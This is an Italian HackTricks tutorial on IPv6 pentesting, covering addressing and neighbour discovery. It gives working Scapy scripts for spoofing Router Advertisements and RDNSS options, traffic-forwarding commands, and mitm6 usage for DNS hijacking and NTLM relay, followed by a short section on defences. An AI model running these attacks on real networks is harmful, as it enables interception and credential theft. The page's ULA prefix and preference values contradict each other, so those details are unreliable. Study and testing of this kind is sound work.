# Pentesting IPv6

{{#include ../../banners/hacktricks-training.md}}

## Teoria di base dell'IPv6

### Reti

Gli indirizzi IPv6 sono strutturati per migliorare l'organizzazione della rete e l'interazione tra i dispositivi. Un indirizzo IPv6 è diviso in:

1. **Prefisso di rete**: I primi 48 bit, che determinano il segmento di rete.
2. **ID sottorete**: I successivi 16 bit, utilizzati per definire sottoreti specifiche all'interno della rete.
3. **Identificatore dell'interfaccia**: Gli ultimi 64 bit, che identificano un dispositivo in modo univoco all'interno della sottorete.

Mentre l'IPv6 omette il protocollo ARP presente nell'IPv4, introduce **ICMPv6** con due messaggi principali:

- **Richiesta di vicinato (NS)**: Messaggi multicast per la risoluzione degli indirizzi.
- **Annuncio di vicinato (NA)**: Risposte unicast a NS o annunci spontanei.

L'IPv6 incorpora anche tipi di indirizzi speciali:

- **Indirizzo di loopback (`::1`)**: Equivalente a `127.0.0.1` di IPv4, per la comunicazione interna all'host.
- **Indirizzi link-local (`FE80::/10`)**: Per attività di rete locali, non per il routing su internet. I dispositivi sulla stessa rete locale possono scoprire l'uno l'altro utilizzando questo intervallo.

### Utilizzo pratico dell'IPv6 nei comandi di rete

Per interagire con le reti IPv6, puoi utilizzare vari comandi:

- **Ping indirizzi link-local**: Controlla la presenza di dispositivi locali utilizzando `ping6`.
- **Scoperta dei vicini**: Usa `ip neigh` per visualizzare i dispositivi scoperti a livello di link.
- **alive6**: Uno strumento alternativo per scoprire dispositivi sulla stessa rete.

Di seguito alcuni esempi di comandi:
```bash
ping6 –I eth0 -c 5 ff02::1 > /dev/null 2>&1
ip neigh | grep ^fe80

# Alternatively, use alive6 for neighbor discovery
alive6 eth0
```
IPv6 gli indirizzi possono essere derivati dall'indirizzo MAC di un dispositivo per la comunicazione locale. Ecco una guida semplificata su come derivare l'indirizzo IPv6 Link-local da un indirizzo MAC noto e una breve panoramica dei tipi di indirizzi IPv6 e dei metodi per scoprire gli indirizzi IPv6 all'interno di una rete.

### **Derivazione dell'IPv6 Link-local dall'indirizzo MAC**

Dato un indirizzo MAC **`12:34:56:78:9a:bc`**, puoi costruire l'indirizzo IPv6 Link-local come segue:

1. Converti il MAC in formato IPv6: **`1234:5678:9abc`**
2. Prependi `fe80::` e inserisci `fffe` nel mezzo: **`fe80::1234:56ff:fe78:9abc`**
3. Inverti il settimo bit da sinistra, cambiando `1234` in `1034`: **`fe80::1034:56ff:fe78:9abc`**

### **Tipi di indirizzi IPv6**

- **Unique Local Address (ULA)**: Per comunicazioni locali, non destinato al routing su internet pubblico. Prefisso: **`FEC00::/7`**
- **Multicast Address**: Per comunicazione uno-a-molti. Consegnato a tutte le interfacce nel gruppo multicast. Prefisso: **`FF00::/8`**
- **Anycast Address**: Per comunicazione uno-a-più-vicina. Inviato all'interfaccia più vicina secondo il protocollo di routing. Parte dell'intervallo globale unicast **`2000::/3`**.

### **Prefissi degli indirizzi**

- **fe80::/10**: indirizzi Link-Local (simile a 169.254.x.x)
- **fc00::/7**: Unique Local-Unicast (simile a intervalli IPv4 privati come 10.x.x.x, 172.16.x.x, 192.168.x.x)
- **2000::/3**: Global Unicast
- **ff02::1**: Multicast All Nodes
- **ff02::2**: Multicast Router Nodes

### **Scoprire indirizzi IPv6 all'interno di una rete**

#### Modo 1: Utilizzando indirizzi Link-local

1. Ottieni l'indirizzo MAC di un dispositivo all'interno della rete.
2. Deriva l'indirizzo IPv6 Link-local dall'indirizzo MAC.

#### Modo 2: Utilizzando Multicast

1. Invia un ping all'indirizzo multicast `ff02::1` per scoprire indirizzi IPv6 sulla rete locale.
```bash
service ufw stop # Stop the firewall
ping6 -I <IFACE> ff02::1 # Send a ping to multicast address
ip -6 neigh # Display the neighbor table
```
### Attacchi Man-in-the-Middle (MitM) IPv6

Esistono diverse tecniche per eseguire attacchi MitM nelle reti IPv6, come:

- Spoofing delle pubblicità dei vicini o dei router ICMPv6.
- Utilizzo di messaggi ICMPv6 di reindirizzamento o "Pacchetto Troppo Grande" per manipolare il routing.
- Attacco a IPv6 mobile (di solito richiede che IPSec sia disabilitato).
- Configurazione di un server DHCPv6 malevolo.

## Identificazione degli Indirizzi IPv6 nel campo

### Esplorazione dei Sottodomini

Un metodo per trovare sottodomini che sono potenzialmente collegati a indirizzi IPv6 implica l'uso di motori di ricerca. Ad esempio, impiegare un modello di query come `ipv6.*` può essere efficace. In particolare, il seguente comando di ricerca può essere utilizzato in Google:
```bash
site:ipv6./
```
### Utilizzo delle Query DNS

Per identificare gli indirizzi IPv6, è possibile interrogare determinati tipi di record DNS:

- **AXFR**: Richiede un trasferimento completo della zona, potenzialmente rivelando un'ampia gamma di record DNS.
- **AAAA**: Cerca direttamente indirizzi IPv6.
- **ANY**: Una query ampia che restituisce tutti i record DNS disponibili.

### Probing con Ping6

Dopo aver individuato gli indirizzi IPv6 associati a un'organizzazione, è possibile utilizzare l'utilità `ping6` per il probing. Questo strumento aiuta a valutare la reattività degli indirizzi IPv6 identificati e potrebbe anche assistere nella scoperta di dispositivi IPv6 adiacenti.

## Tecniche di Attacco alla Rete Locale IPv6

Le sezioni seguenti trattano attacchi pratici IPv6 di livello 2 che possono essere eseguiti **all'interno dello stesso segmento /64** senza conoscere alcun prefisso globale. Tutti i pacchetti mostrati di seguito sono **link-local** e viaggiano solo attraverso lo switch locale, rendendoli estremamente furtivi nella maggior parte degli ambienti.

### Ottimizzazione del Sistema per un Laboratorio Stabile

Prima di giocare con il traffico IPv6, è consigliabile indurire il proprio sistema per evitare di essere avvelenati dai propri test e per ottenere le migliori prestazioni durante l'iniezione/sniffing di pacchetti massivi.
```bash
# Enable promiscuous mode to capture all frames
sudo ip link set dev eth0 promisc on

# Ignore rogue Router Advertisements & Redirects coming from the segment
sudo sysctl -w net.ipv6.conf.all.accept_ra=0
sudo sysctl -w net.ipv6.conf.all.accept_redirects=0

# Increase fd / backlog limits when generating lots of traffic
sudo sysctl -w fs.file-max=100000
sudo sysctl -w net.core.somaxconn=65535
sudo sysctl -w net.ipv4.tcp_tw_reuse=1
```
### Sniffing passivo NDP & DHCPv6

Poiché ogni host IPv6 **si unisce automaticamente a più gruppi multicast** (`ff02::1`, `ff02::2`, …) e utilizza ICMPv6 per SLAAC/NDP, puoi mappare l'intero segmento senza inviare un singolo pacchetto. Il seguente one-liner Python/Scapy ascolta i messaggi L2 più interessanti e stampa un log colorato e timestampato di chi è chi:
```python
#!/usr/bin/env python3
from scapy.all import *
from scapy.layers.dhcp6 import *
from datetime import datetime
from colorama import Fore, Style, init
import argparse

init(autoreset=True)

# Human-readable names for protocols we care about
DHCP6_TYPES = {
DHCP6_Solicit:    'Solicit',
DHCP6_Advertise:  'Advertise',
DHCP6_Request:    'Request',
DHCP6_Reply:      'Reply',
DHCP6_Renew:      'Renew',
DHCP6_Rebind:     'Rebind',
DHCP6_RelayForward:'Relay-Forward',
DHCP6_RelayReply: 'Relay-Reply'
}
ICMP6_TYPES = {
ICMPv6ND_RS:      ('Router Solicitation',  Fore.CYAN),
ICMPv6ND_RA:      ('Router Advertisement', Fore.GREEN),
ICMPv6ND_NS:      ('Neighbor Solicitation',Fore.BLUE),
ICMPv6ND_NA:      ('Neighbor Advertisement',Fore.MAGENTA),
ICMPv6ND_Redirect:('Redirect',             Fore.LIGHTRED_EX),
ICMPv6MLReport:   ('MLD Report',           Fore.LIGHTCYAN_EX),
ICMPv6MLReport2:  ('MLD Report',           Fore.LIGHTCYAN_EX),
ICMPv6MLDone:     ('MLD Done',             Fore.LIGHTCYAN_EX),
ICMPv6EchoRequest:('Echo Request',         Fore.LIGHTBLACK_EX),
ICMPv6EchoReply:  ('Echo Reply',           Fore.LIGHTBLACK_EX)
}

def handler(pkt):
eth_src = pkt[Ether].src if Ether in pkt else '?'
eth_dst = pkt[Ether].dst if Ether in pkt else '?'
ip6_src = pkt[IPv6].src if IPv6 in pkt else '?'
ip6_dst = pkt[IPv6].dst if IPv6 in pkt else '?'

# Identify protocol family first
for proto,(desc,color) in ICMP6_TYPES.items():
if proto in pkt:
break
else:
if UDP in pkt and pkt[UDP].dport == 547:  # DHCPv6 server port
for dhcp_t,name in DHCP6_TYPES.items():
if dhcp_t in pkt:
desc = 'DHCPv6 – '+name; color = Fore.YELLOW; break
else:
return  # not a DHCPv6 message we track
else:
return  # not interesting

print(color + f"[{datetime.now().strftime('%H:%M:%S')}] {desc}")
print(f"  MAC  {eth_src} -> {eth_dst}")
print(f"  IPv6 {ip6_src} -> {ip6_dst}")
print('-'*60)

if __name__ == '__main__':
argp = argparse.ArgumentParser(description='IPv6 NDP & DHCPv6 sniffer')
argp.add_argument('-i','--interface',required=True,help='Interface to sniff')
argp.add_argument('-t','--time',type=int,default=0,help='Duration (0 = infinite)')
a = argp.parse_args()
sniff(iface=a.interface,prn=handler,timeout=a.time or None,store=0)
```
Risultato: una **topologia link-local** completa (MAC ⇄ IPv6) in pochi secondi, senza attivare sistemi IPS/IDS che si basano su scansioni attive.

### Spoofing delle Router Advertisement (RA)

Gli host IPv6 si affidano alle **Router Advertisements ICMPv6** per la scoperta del gateway predefinito. Se inietti RAs contraffatte **più frequentemente** del router legittimo, i dispositivi passeranno silenziosamente a te come gateway.
```python
#!/usr/bin/env python3
from scapy.all import *
import argparse

p = argparse.ArgumentParser()
p.add_argument('-i','--interface',required=True)
p.add_argument('-m','--mac',required=True,help='Source MAC (will be put in SrcLL option)')
p.add_argument('--llip',required=True,help='Link-local source IP, e.g. fe80::dead:beef')
p.add_argument('-l','--lifetime',type=int,default=1800,help='Router lifetime')
p.add_argument('--interval',type=int,default=5,help='Seconds between RAs')
p.add_argument('--revert',action='store_true',help='Send lifetime=0 to undo attack')
args = p.parse_args()

lifetime = 0 if args.revert else args.lifetime
ra = (IPv6(src=args.llip,dst='ff02::1',hlim=255)/
ICMPv6ND_RA(routerlifetime=lifetime, prf=0x1)/  # High preference
ICMPv6NDOptSrcLLAddr(lladdr=args.mac))

send(ra,iface=args.interface,loop=1,inter=args.interval)
```
Per effettivamente **inoltrare il traffico** dopo aver vinto la gara:
```bash
sudo sysctl -w net.ipv6.conf.all.forwarding=1
sudo ip6tables -A FORWARD -i eth0 -j ACCEPT
sudo ip6tables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```
#### Router Advertisement Flags (M/O) & Default Router Preference (Prf)

| Flag | Significato | Effetto sul Comportamento del Client |
|------|-------------|--------------------------------------|
| **M (Managed Address Configuration)** | Quando impostato su `1`, l'host DEVE utilizzare **DHCPv6** per ottenere il proprio indirizzo IPv6. | L'intero indirizzamento proviene da DHCPv6 – perfetto per il poisoning in stile *mitm6*. |
| **O (Other Configuration)** | Quando impostato su `1`, l'host dovrebbe utilizzare **DHCPv6** solo per ottenere informazioni *altre* (DNS, NTP, …). | Indirizzo ancora tramite SLAAC, ma il DNS può essere dirottato con DHCPv6. |
| **M=0 / O=0** | Rete puramente SLAAC. | Solo trucchi RA / RDNSS sono possibili – DHCPv6 non sarà inviato dai client. |
| **M=1 / O=1** | Ambiente misto. | Sia DHCPv6 che SLAAC sono utilizzati; la superficie per lo spoofing è la più grande. |

Durante un pentest puoi semplicemente ispezionare il RA legittimo una volta e decidere quale vettore è fattibile:
```bash
sudo tcpdump -vvv -i eth0 'icmp6 && ip6[40] == 134'   # capture Router Advertisements
```
Cerca il campo `flags [M,O]` nel dump – non è necessaria alcuna supposizione.

Il campo **Prf** (Router Preference) all'interno dell'intestazione RA controlla quanto è attraente il tuo router rogue quando sono presenti *più* gateway:

| Valore Prf | Binario | Significato |
|------------|---------|-------------|
| **Alto**   | `10`    | I client preferiscono questo router rispetto a qualsiasi router *Medio*/*Basso* |
| Medio (predefinito) | `01` | Utilizzato da quasi tutti i dispositivi legittimi |
| Basso     | `00`    | Scelto solo quando non esiste un router migliore |

Quando generi il pacchetto con Scapy puoi impostarlo tramite il parametro `prf` come mostrato sopra (`prf=0x1` → Alto). Combinare **Alto Prf**, un **breve intervallo** e una **durata non zero** rende il tuo gateway rogue notevolmente stabile.

---

### Spoofing RDNSS (DNS) tramite RA

[RFC 8106](https://datatracker.ietf.org/doc/html/rfc8106) consente di aggiungere un'opzione **Recursive DNS Server (RDNSS)** all'interno di un RA. I moderni sistemi operativi (Win 10 ≥1709, Win 11, macOS Big Sur, Linux systemd-resolved, …) si fidano automaticamente di esso:
```python
#!/usr/bin/env python3
from scapy.all import *
import argparse

p = argparse.ArgumentParser()
p.add_argument('-i','--interface',required=True)
p.add_argument('--llip',required=True)
p.add_argument('--dns',required=True,help='Fake DNS IPv6')
p.add_argument('--lifetime',type=int,default=600)
p.add_argument('--interval',type=int,default=5)
args = p.parse_args()

ra = (IPv6(src=args.llip,dst='ff02::1',hlim=255)/
ICMPv6ND_RA(routerlifetime=0)/
ICMPv6NDOptRDNSS(dns=[args.dns],lifetime=args.lifetime))

send(ra,iface=args.interface,loop=1,inter=args.interval)
```
I clienti **prependono** il tuo DNS alla loro lista di resolver per la durata data, concedendo un completo hijacking DNS fino a quando il valore non scade o invii un `lifetime=0` per il ripristino.

### DHCPv6 DNS Spoofing (mitm6)

Invece di SLAAC, le reti Windows spesso dipendono da **DHCPv6 senza stato** per il DNS. [mitm6](https://github.com/rofl0r/mitm6) risponde automaticamente ai messaggi `Solicit` con un flusso **Advertise → Reply** che assegna **il tuo indirizzo link-local come DNS per 300 secondi**. Questo sblocca:

* Attacchi di relay NTLM (WPAD + hijacking DNS)
* Intercettazione della risoluzione dei nomi interni senza toccare i router

Utilizzo tipico:
```bash
sudo mitm6 -i eth0 --no-ra # only DHCPv6 poisoning
```
### Difese

* **RA Guard / DHCPv6 Guard / ND Inspection** su switch gestiti.
* ACL di porta che consentono solo al MAC del router legittimo di inviare RAs.
* Monitorare per **RAs ad alta frequenza non solidi** o improvvisi **cambiamenti RDNSS**.
* Disabilitare IPv6 sugli endpoint è una soluzione temporanea che spesso interrompe i servizi moderni e nasconde punti ciechi – preferire invece il filtraggio L2.

## Riferimenti

- [Legless – IPv6 Penetration Testing](https://blog.exploit.org/caster-legless/)
- [mitm6](https://github.com/rofl0r/mitm6)
- [RFC 8106 – IPv6 ND DNS Configuration](https://datatracker.ietf.org/doc/html/rfc8106)
- [http://www.firewall.cx/networking-topics/protocols/877-ipv6-subnetting-how-to-subnet-ipv6.html](http://www.firewall.cx/networking-topics/protocols/877-ipv6-subnetting-how-to-subnet-ipv6.html)
- [https://www.sans.org/reading-room/whitepapers/detection/complete-guide-ipv6-attack-defense-33904](https://www.sans.org/reading-room/whitepapers/detection/complete-guide-ipv6-attack-defense-33904)
- [Practical Guide to IPv6 Attacks in a Local Network](https://habr.com/ru/articles/930526/)

{{#include ../../banners/hacktricks-training.md}}
